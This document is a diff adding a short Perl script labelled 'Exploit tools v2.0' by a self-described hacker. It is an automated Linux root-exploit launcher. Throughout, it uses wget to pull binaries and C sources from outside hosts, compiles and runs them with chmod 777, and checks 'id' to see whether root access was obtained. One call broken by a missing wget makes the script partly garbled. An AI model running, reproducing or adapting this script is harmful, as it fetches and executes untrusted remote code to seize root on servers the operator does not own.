@@ -1,0 +1,75 @@
+#!/usr/bin/perl 
+# Exploit tools v2.0 coded by iskorpitx (Turkish Hacker)
+# linux serverlerde gecerlidir
+# iyi sanslar:)
+# by iskorpitx
+{  
+system("wget www.xk150.de/w/15704.c"); 
+system("gcc 15704.c -o 1704");
+system("chmod 777 1704"); 
+system("./1704"); 
+system("id"); 
+system("wget www.xk150.de/w/15704");  
+system("chmod 777 15704"); 
+system("./15704"); 
+system("id"); 
+system("wget www.xk150.de/w/froot");  
+system("chmod 777 froot"); 
+system("./froot"); 
+system("id"); 
+system("wget www.xk150.de/w/iskorpitx");  
+system("chmod 777 iskorpitx"); 
+system("./iskorpitx"); 
+system("id"); 
+system("wget www.xk150.de/w/exp1");  
+system("chmod 777 exp1"); 
+system("./exp1"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n";
+system("wget www.xk150.de/w/exp2");  
+system("chmod 777 exp2"); 
+system("./exp2"); 
+system("id");  
+system("wget www.xk150.de/w/run2");  
+system("chmod 777 run2"); 
+system("./run2"); 
+system("id");  
+print "If u r r00t stop xpl with ctrl+c\n"; 
+system("wget www.xk150.de/w/15285.c"); 
+system("gcc 15285.c -o 15285");
+system("chmod 777 15285"); 
+system("./15285"); 
+system("id"); 
+print "If u r r00t stop xpl with ctrl+c\n"; 
+system("wget www.xk150.de/w/27"); 
+system("chmod 777 27"); 
+system("./27"); 
+system("id"); 
+system("wget www.xk150.de/w/27-1"); 
+system("chmod 777 27-1"); 
+system("./27-1"); 
+system("id"); 
+system("http://www.solarenergy.com.bd/templates/beez/15150"); 
+system("chmod 777 15150"); 
+system("./15150 0xc0102290 64"); 
+system("id"); 
+system("wget www.xk150.de/w/siy");
+system("chmod 777 siy");
+system("./siy");
+system("id");
+system("wget www.xk150.de/w/15620.sh");
+system("chmod 777 15620.sh");
+system("./15620.sh");
+system("id");
+system("wget www.xk150.de/w/20201");
+system("chmod 777 20201");
+system("./20201");
+system("id");
+print "If u r r00t stop xpl with ctrl+c\n"; 
+system("wget www.xk150.de/w/15"); 
+system("chmod 777 15"); 
+system("./15"); 
+system("id");
+system("id");
+system("whoami");
+}
